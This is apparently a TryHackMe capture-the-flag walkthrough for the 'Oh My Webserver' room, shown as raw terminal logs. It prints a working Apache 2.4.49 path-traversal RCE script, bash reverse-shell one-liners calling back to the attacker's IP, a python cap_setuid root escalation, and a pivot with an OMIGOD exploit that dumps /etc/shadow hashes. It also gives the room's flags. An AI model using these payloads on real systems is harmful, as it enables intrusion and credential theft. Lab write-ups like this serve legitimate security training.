---
Can you root me?
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/c1833021c98fa6c74fc125f4b34741ca.png)
### oh-My-Webserver

 Start Machine

Deploy the machine attached to this task and happy hacking!

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.214.74 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.214.74:22
Open 10.10.214.74:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-27 10:57 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:57, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:57
Completed Parallel DNS resolution of 1 host. at 10:57, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:57
Scanning 10.10.214.74 [2 ports]
Discovered open port 80/tcp on 10.10.214.74
Discovered open port 22/tcp on 10.10.214.74
Completed Connect Scan at 10:57, 0.19s elapsed (2 total ports)
Initiating Service scan at 10:57
Scanning 2 services on 10.10.214.74
Completed Service scan at 10:57, 6.48s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.214.74.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:57
Completed NSE at 10:58, 7.38s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 1.25s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
Nmap scan report for 10.10.214.74
Host is up, received user-set (0.19s latency).
Scanned at 2023-02-27 10:57:49 EST for 15s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0d188762a9379d391046d25160e56d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMlfGBGWZkPg98VnvD+FVeesHsQwmtoJfMOMhifMjxD9AEluFQNVnoyxyQi5y9O2/AN/MO+l57li33lHiVjD1eglBjB3Lkzz3tpRJSmGn2Ug3jRypShkSJ9VkUVFElw8MXke62w3+9pi+S0Ub1DqcttGH8TqihiWvqJbJYnecqjdcka1uKPdPna0gleow9JiaAH3X4EMFdcXZDOGgnOaZId2mEXFDeNNYFZpS+EOcLgXaAp1NobUckE9NXvE73qw+pBNo69m3z4MG7/cJNIsQiFpm5yqgCKJGjhwGFp4zAMXOD23lj1g+iQlwrchwY5nBEHHae1PjQwLjwuWebjWR+bWPalPVYa4d8+15TjjgV8VW/Rac3rTX+A/buyVxUSMhkBtn7fQ2sLoMPPn7vRDo3ggGl5IZaYIvSYRDk9nadsZk+YKUCSgFf97z0PK278vbrPwjJTyyScAnjvs+oLnD/bAdja4uwOOS2CHehjzipVmWf7zR3srIfjZQ4aAUmeh8=
|   256 91185c2c5ef8993c9a1f0424300eaa9b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLf6FvNwGNtpra24lyJ4YWPqB8olwPXhKdr6gSW6Dc+oXdZJbQPtpD7cph3nvR9sQQnTKGiG69XyGKh0ervYI1U=
|   256 d1632a36dd94cf3c573e8ae88500caf6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEzBDIQu+cp4gApnTbTbtmqljyAcr/Za8goiY57VM+uq
80/tcp open  http    syn-ack Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49 (Unix)
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:58
Completed NSE at 10:58, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds

Apache httpd 2.4.49 

https://www.exploit-db.com/exploits/50383

┌──(witty㉿kali)-[~/Downloads]
└─$ nano 50383.sh
                                                                            
┌──(witty㉿kali)-[~/Downloads]
└─$ echo '10.10.214.74' > targets.txt                           
                                                                            
┌──(witty㉿kali)-[~/Downloads]
└─$ cat 50383.sh 
#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami

┌──(witty㉿kali)-[~/Downloads]
└─$ bash 50383.sh targets.txt /bin/sh whoami     
10.10.214.74
daemon

┌──(witty㉿kali)-[~/Downloads]
└─$ bash 50383.sh targets.txt /bin/sh '/bin/bash -c "bash -i >& /dev/tcp/10.8.19.103/1337 0>&1"'
10.10.214.74

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.214.74] 46792
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@4a70924bafa0:/bin$ whoami
whoami
daemon
daemon@4a70924bafa0:/bin$ cd /
cd /
daemon@4a70924bafa0:/$ ls -lah
ls -lah
total 76K
drwxr-xr-x   1 root root 4.0K Feb 23  2022 .
drwxr-xr-x   1 root root 4.0K Feb 23  2022 ..
-rwxr-xr-x   1 root root    0 Feb 23  2022 .dockerenv
drwxr-xr-x   1 root root 4.0K Oct  8  2021 bin
drwxr-xr-x   2 root root 4.0K Jun 13  2021 boot
drwxr-xr-x   5 root root  340 Feb 27 15:56 dev
drwxr-xr-x   1 root root 4.0K Feb 23  2022 etc
drwxr-xr-x   2 root root 4.0K Jun 13  2021 home
drwxr-xr-x   1 root root 4.0K Oct  8  2021 lib
drwxr-xr-x   2 root root 4.0K Sep 27  2021 lib64
drwxr-xr-x   2 root root 4.0K Sep 27  2021 media
drwxr-xr-x   2 root root 4.0K Sep 27  2021 mnt
drwxr-xr-x   2 root root 4.0K Sep 27  2021 opt
dr-xr-xr-x 170 root root    0 Feb 27 15:56 proc
drwx------   1 root root 4.0K Oct  8  2021 root
drwxr-xr-x   3 root root 4.0K Sep 27  2021 run
drwxr-xr-x   1 root root 4.0K Oct  8  2021 sbin
drwxr-xr-x   2 root root 4.0K Sep 27  2021 srv
dr-xr-xr-x  13 root root    0 Feb 27 15:56 sys
drwxrwxrwt   1 root root 4.0K Feb 23  2022 tmp
drwxr-xr-x   1 root root 4.0K Sep 27  2021 usr
drwxr-xr-x   1 root root 4.0K Sep 27  2021 var

daemon@4a70924bafa0:/$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root root        51K Jan 10  2019 /bin/mount
-rwsr-xr-x 1 root root        63K Jan 10  2019 /bin/su
-rwsr-xr-x 1 root root        35K Jan 10  2019 /bin/umount
-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd
-rwsr-xr-- 1 root messagebus  50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        46K Sep 28  2021 /usr/local/apache2/bin/suexec

daemon@4a70924bafa0:/$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
user.txt
# cat user.txt
cat user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}

root@4a70924bafa0:/root# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 85464  bytes 13192306 (12.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 79081  bytes 28186090 (26.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@4a70924bafa0:/root# ping 172.17.0.1
ping 172.17.0.1
bash: ping: command not found
root@4a70924bafa0:/root# curl http://172.17.0.1
curl http://172.17.0.2
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    
    <!--====== Title ======-->
    <title>Consult - Business Consultancy Agency Template | Home</title>

root@4a70924bafa0:/bin# for ip in 1 2; do echo "172.17.0.$ip:"; for i in {1..15000}; do echo 2>/dev/null > /dev/tcp/172.17.0.$ip/$i && echo "$i open"; done; echo " ";done;
<17.0.$ip/$i && echo "$i open"; done; echo " ";done;
172.17.0.1:
...

using curl

┌──(witty㉿kali)-[~/Downloads]
└─$ cat curl.sh 
#!/bin/bash

for port in {1..65535}; do
    if curl --connect-timeout 2 -s -I 172.17.0.1:$port >/dev/null; then
        echo "Port $port is open"
    else
        echo "Port $port is closed or unknown"
    fi
done

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.214.74 - - [27/Feb/2023 12:53:56] "GET /curl.sh HTTP/1.1" 200 -
root@4a70924bafa0:/bin# curl -o curl.sh http://10.8.19.103:1234/curl.sh
curl -o curl.sh http://10.8.19.103:1234/curl.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   143  100   143    0     0    290      0 --:--:-- --:--:-- --:--:--   290


maybe getting a nmap binary

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 7070                            
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
10.10.135.128 - - [27/Feb/2023 13:02:39] "GET /curl.sh HTTP/1.1" 200 -
10.10.135.128 - - [27/Feb/2023 13:05:58] "GET /nmap HTTP/1.1" 200 -

root@4a70924bafa0:/tmp# curl -o nmap http://10.8.19.103:7070/nmap
curl -o nmap http://10.8.19.103:7070/nmap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0  1332k      0  0:00:04  0:00:04 --:--:-- 1332k

root@4a70924bafa0:/tmp# chmod +x nmap
chmod +x nmap

root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 5000
./nmap 172.17.0.1 -p- --min-rate 5000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-02-27 18:16 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000030s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:B2:08:1C:C6 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.76 seconds

https://github.com/AlteredSecurity/CVE-2021-38647

https://github.com/horizon3ai/CVE-2021-38647

┌──(witty㉿kali)-[~/Downloads]
└─$ git clone https://github.com/horizon3ai/CVE-2021-38647.git
Cloning into 'CVE-2021-38647'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 14 (delta 2), reused 9 (delta 2), pack-reused 0
Receiving objects: 100% (14/14), 9.86 KiB | 373.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.

doing again

┌──(witty㉿kali)-[~/Downloads]
└─$ curl -v 'http://10.10.135.128//cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; sh -i >& /dev/tcp/10.8.19.103/1337 0>&1' -H "Content-Type: text/plain"
*   Trying 10.10.135.128:80...
* Connected to 10.10.135.128 (10.10.135.128) port 80 (#0)
> POST //cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
> Host: 10.10.135.128
> User-Agent: curl/7.87.0
> Accept: */*
> Content-Type: text/plain
> Content-Length: 76
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 27 Feb 2023 18:21:46 GMT
< Server: Apache/2.4.49 (Unix)
< Transfer-Encoding: chunked
< Content-Type: text/plain

┌──(witty㉿kali)-[~/Downloads/CVE-2021-38647]
└─$ ls
omigod.py  proof.png  README.md

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.135.128] 34990
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
daemon@4a70924bafa0:/bin$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
# bash
bash
root@4a70924bafa0:/bin# cd /tmp
cd /tmp
root@4a70924bafa0:/tmp# ls
ls
nmap
curl -o omigod.py http://10.8.19.103:7070/omigod.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2720  100  2720    0     0   6296      0 --:--:-- --:--:-- --:--:--  6296

root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -c "whoami;id;cat /etc/shadow;cat /root/root.txt"
<1 -c "whoami;id;cat /etc/shadow;cat /root/root.txt"
root&#10;uid=0(root) gid=0(root) groups=0(root)&#10;root:$6$x7/DJQUNJgF2HsCq$F.KakHRIWPl4.mbeeY3L6Bx2Mdg6VCiBIwVALTG.bg/vG6vo7FoIbr9NLmoNTqaY9Lla/AOue/jkhENQ2wvO5/:18908:0:99999:7:::&#10;daemon:*:18659:0:99999:7:::&#10;bin:*:18659:0:99999:7:::&#10;sys:*:18659:0:99999:7:::&#10;sync:*:18659:0:99999:7:::&#10;games:*:18659:0:99999:7:::&#10;man:*:18659:0:99999:7:::&#10;lp:*:18659:0:99999:7:::&#10;mail:*:18659:0:99999:7:::&#10;news:*:18659:0:99999:7:::&#10;uucp:*:18659:0:99999:7:::&#10;proxy:*:18659:0:99999:7:::&#10;www-data:*:18659:0:99999:7:::&#10;backup:*:18659:0:99999:7:::&#10;list:*:18659:0:99999:7:::&#10;irc:*:18659:0:99999:7:::&#10;gnats:*:18659:0:99999:7:::&#10;nobody:*:18659:0:99999:7:::&#10;systemd-network:*:18659:0:99999:7:::&#10;systemd-resolve:*:18659:0:99999:7:::&#10;systemd-timesync:*:18659:0:99999:7:::&#10;messagebus:*:18659:0:99999:7:::&#10;syslog:*:18659:0:99999:7:::&#10;_apt:*:18659:0:99999:7:::&#10;tss:*:18659:0:99999:7:::&#10;uuidd:*:18659:0:99999:7:::&#10;tcpdump:*:18659:0:99999:7:::&#10;landscape:*:18659:0:99999:7:::&#10;pollinate:*:18659:0:99999:7:::&#10;usbmux:*:18900:0:99999:7:::&#10;sshd:*:18900:0:99999:7:::&#10;systemd-coredump:!!:18900::::::&#10;ubuntu:$6$87IYj.DXrYWsA9Yq$ZTim1Zo/UhfEFnbjz6mj9MvyyHR48dWdk1iL5yJ9o1.WO84AStOBM.ahug0L0ICR.1FgvgWN4TV4vtSosuKeD1:18908:0:99999:7:::&#10;lxd:!:18900::::::&#10;omi:!:18900::::::&#10;dnsmasq:*:18908:0:99999:7:::&#10;
THM{7f147ef1f36da9ae29529890a1b6011f}

```

What is the user flag?

*THM{eacffefe1d2aafcc15e70dc2f07f7ac1}*

What is the root flag?

*THM{7f147ef1f36da9ae29529890a1b6011f}*

[[Road]]